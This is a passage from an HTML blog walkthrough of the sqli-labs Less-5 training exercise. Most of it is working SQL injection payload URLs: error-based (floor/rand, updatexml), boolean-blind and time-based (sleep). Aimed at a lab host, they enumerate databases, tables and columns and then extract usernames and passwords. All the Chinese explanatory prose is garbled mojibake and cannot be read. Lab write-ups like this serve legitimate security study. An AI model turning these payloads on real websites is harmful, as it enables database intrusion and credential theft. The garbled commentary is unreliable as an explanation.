class><p><code>æ¥ç€æµ‹è¯•å‘ç°å­˜åœ¨æ—¶é—´å»¶æ—¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and sleep(5) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231175223651.png" class><h3 id="1-ç¬¬ä¸€ç§æ–¹æ³•-åˆ©ç”¨æŠ¥é”™æ³¨å…¥"><a href="#1-ç¬¬ä¸€ç§æ–¹æ³•-åˆ©ç”¨æŠ¥é”™æ³¨å…¥" class="headerlink" title="1.ç¬¬ä¸€ç§æ–¹æ³•(åˆ©ç”¨æŠ¥é”™æ³¨å…¥)"></a>1.ç¬¬ä¸€ç§æ–¹æ³•(åˆ©ç”¨æŠ¥é”™æ³¨å…¥)</h3><p><strong>å…ˆæ¥ç†è§£å‡ ä¸ªå‡½æ•°</strong></p><p><code>concatèšåˆå‡½æ•°</code></p><blockquote><p>ç®€å•çš„è¯´ï¼Œä½¿ç”¨èšåˆå‡½æ•°è¿›è¡ŒåŒæ³¨å…¥æŸ¥è¯¢æ—¶ï¼Œä¼šåœ¨é”™è¯¯ä¿¡æ¯ä¸­æ˜¾ç¤ºä¸€éƒ¨åˆ†é”™è¯¯ä¿¡æ¯ã€‚</p><p>æ¯”å¦‚countå‡½æ•°åé¢å¦‚æœä½¿ç”¨åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚</p><p>å¦‚ä¸‹ä¾‹ï¼šæ•°æ®åº“ç‰ˆæœ¬ä¸º5.5.530</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat((select version()), floor(rand()*2))as x from information_schema.tables group by x;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231192403062.png" class><p><code>rand()å‡½æ•°</code></p><blockquote><p>rand() æ˜¯ä¸€ä¸ªéšæœºå‡½æ•°ï¼Œé€šè¿‡ä¸€ä¸ªå›ºå®šçš„éšæœºæ•°çš„ç§å­0ä¹‹åï¼Œå¯ä»¥å½¢æˆå›ºå®šçš„ä¼ªéšæœºåºåˆ—ï¼Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°éƒ½æ˜¯ä¸€æ ·çš„ã€‚å¦‚ä¸‹å›¾</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231190859205.png" class><p><code>floor()å‡½æ•°</code></p><blockquote><p>floor() å‡½æ•°çš„ä½œç”¨å°±æ˜¯è¿”å›å°äºç­‰äºæ‹¬å·å†…è¯¥å€¼çš„æœ€å¤§æ•´æ•°ï¼Œä¹Ÿå°±æ˜¯å–æ•´ã€‚floor(rand(0)*2)è¾“å‡ºå¦‚ä¸‹ã€‚</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231191348407.png" class><p><code>group by</code></p><blockquote><p>group by ä¸»è¦ç”¨æ¥å¯¹æ•°æ®è¿›è¡Œåˆ†ç»„ï¼ˆç›¸åŒçš„åˆ†ä¸ºä¸€ç»„ï¼Œç›¸åŒåå­—ä¼šåˆå¹¶ï¼‰</p></blockquote><p><code>count(*)</code></p><blockquote><p>count(*)ç”¨äºç»Ÿè®¡æ•°æ®å‡ºç°çš„æ¬¡æ•°</p></blockquote><p><strong>æ¢æµ‹åˆ—æ•°ï¼Œç»“æœä¸º3åˆ—</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231200902624.png" class><p><strong>çˆ†åº“</strong></p><blockquote><p>æŠ¥é”™æ—¶æ‰ä¼šå›æ˜¾</p></blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIzNTQ5Ni5odG1s">é”®å€¼æŠ¥é”™åŸç†å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201157161.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201226057.png" class><p><strong>çˆ†è¡¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">æˆ–</span><br><span class="line">å°†table_schema=database()æ¢ä¸ºtable_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231204516748.png" class><p><strong>çˆ†usersè¡¨åˆ—å</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205019454.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205043144.png" class><p><strong>çˆ†å­—æ®µ</strong></p><blockquote><p>concat_wsç”¨äºæŒ‡å®šç¬¦å·æ‹¼æ¥ï¼Œæœ¬æ¬¡ä½¿ç”¨-æ‹¼æ¥</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 0,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 1,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 3,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">ã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231210556609.png" class><p><code>å¦ä¸€ç§æŠ¥é”™æ–¹å¼</code></p><blockquote><p>ä½¿ç”¨updatexmlå‡½æ•°ï¼Œupdatexml(XML_document, XPath_string, new_value);</p></blockquote><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>XML_document</td><td>Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</td></tr><tr><td>XPath_string</td><td>Xpathæ ¼å¼çš„å­—ç¬¦ä¸²</td></tr><tr><td>new_value</td><td>Stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</td></tr></tbody></table><p><strong>payloadå¦‚ä¸‹</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select ***()),0x7e),1</span><br></pre></td></tr></table></figure><p><strong>åŸç†</strong></p><blockquote><p><code>concat()</code>å‡½æ•°æ˜¯å°†å…¶è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ä¼šç¬¦åˆ<strong>XPATH_string</strong>çš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯</p></blockquote><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102233937461.png" class><p><code>ç®€å•çš„æ–¹æ³•</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234125500.png" class><p><code>ç”¨æˆ·ç‰ˆæœ¬ç­‰</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234201499.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234230939.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234706750.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234733739.png" class><p><code>çˆ†å­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 2,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235422105.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235434612.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235643837.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235701283.png" class><h3 id="2-ç¬¬äºŒç§æ–¹æ³•-åˆ©ç”¨boolæ³¨å…¥"><a href="#2-ç¬¬äºŒç§æ–¹æ³•-åˆ©ç”¨boolæ³¨å…¥" class="headerlink" title="2.ç¬¬äºŒç§æ–¹æ³•(åˆ©ç”¨boolæ³¨å…¥)"></a>2.ç¬¬äºŒç§æ–¹æ³•(åˆ©ç”¨boolæ³¨å…¥)</h3><p><code>åœ¨å¸ƒå°”å‹æ³¨å…¥ä¸­ï¼Œæ­£ç¡®ä¼šå›æ˜¾ï¼Œé”™è¯¯æ²¡æœ‰å›æ˜¾ï¼Œä»¥æ­¤ä¸ºä¾æ®é€å­—çˆ†ç ´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101182907330.png" class><blockquote><p>æ­¤ç§æ³¨å…¥å¯ä»¥ä½¿ç”¨bpçš„intruderæ¨¡å—è¿›è¡Œçˆ†ç ´ï¼Œå¦‚ä¸‹å›¾ã€‚ç”±äºmysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å­—å…¸ä¸ºa-zã€0-9ï¼Œç‰¹æ®Šçš„åŠ ä¸Šç‰¹æ®Šå­—ç¬¦å³å¯ã€‚</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190352877.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190421957.png" class><p><code>ä¾æ¬¡ç±»æ¨ï¼Œè¿›è¡Œçˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183102013.png" class><p><code>æ¥ä¸‹æ¥è¿›è¡Œçˆ†ç¬¬ä¸€å¼ è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&#x27;em&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),6)=&#x27;emails&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183326285.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183525900.png" class><p><code>çˆ†å‡ºç¬¬å››å¼ è¡¨ä¸ºusersï¼Œæ¥ä¸‹æ¥è¿›è¡Œçˆ†åˆ—å</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure><p><code>ç¬¬ä¸€ä¸ªåˆ—åä¸ºid</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222734437.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure><p><code>ç¬¬äºŒä¸ªä¸ç¬¬ä¸‰ä¸ªåˆ—åä¸ºusernameã€password</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222533544.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222604381.png" class><p><code>çˆ†æ•°æ®å³usernameä¸passwordå­—æ®µçš„å†…å®¹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select username from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185002099.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select password from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185116009.png" class><p><strong>ä¹Ÿå¯ä»¥ä½¿ç”¨substræˆªæ–­å‡½æ•°è¿›è¡Œçˆ†åº“ã€çˆ†è¡¨ã€çˆ†å­—æ®µ</strong></p><blockquote><p>substrå‡½æ•°ä¸limitä¸åŒï¼Œæˆªå–ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºä»1å¼€å§‹ï¼Œè€Œlimitä»0å¼€å§‹</p></blockquote><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),2,1)=&#x27;e&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),3,1)=&#x27;c&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),4,1)=&#x27;u&#x27; -- -</span><br><span class="line">// åŒæ ·å¯ä»¥ä½¿ç”¨intruderè¿›è¡Œçˆ†ç ´</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102204726445.png" class><p><code>ä¹Ÿå¯ä»¥ä½¿ç”¨ASCIIè¿›è¡ŒæŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and ord(substr(database(),1,1))=115 -- -</span><br><span class="line">// ordä¸ºASCIIè½¬æ¢å‡½æ•°ï¼Œsçš„ASCIIå€¼ä¸º115ã€‚</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205332810.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205349191.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#x27;u&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,2)=&#x27;us&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,3)=&#x27;use&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,4)=&#x27;user&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,5)=&#x27;users&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205811674.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102210130815.png" class><p><code>çˆ†å­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1,2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222854581.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),1,8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),1,8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223125374.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223201941.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223440143.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223459949.png" class><p><strong><em>skipï¼šè¿™ç§æ–¹æ³•å°±æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œç´¯å‚»å°å­çš„æ´»å»ºè®®sqlmapğŸ’‚â€â™€ï¸</em></strong></p><h3 id="3-ç¬¬ä¸‰ç§æ–¹æ³•-åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥"><a href="#3-ç¬¬ä¸‰ç§æ–¹æ³•-åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥" class="headerlink" title="3.ç¬¬ä¸‰ç§æ–¹æ³•(åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥)"></a>3.ç¬¬ä¸‰ç§æ–¹æ³•(åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥)</h3><p><code>çˆ†åº“åé•¿åº¦ï¼Œè¿™é‡Œä¾æ—§å¯ä»¥ä½¿ç”¨intruder</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(length(database())=8,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190911402.png" class><p><code>çˆ†åº“</code></p><p><code>ä¹Ÿå¯ä»¥å°†length()æ¢ä¸ºsubstr()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/id=1&#x27; and if(left(database(),8)=&#x27;security&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191846689.png" class><p><code>çˆ†è¡¨ï¼Œç¬¬å››å¼ è¡¨ä¸ºusers</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;users&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191536441.png" class><p><code>çˆ†usersè¡¨çš„å­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select 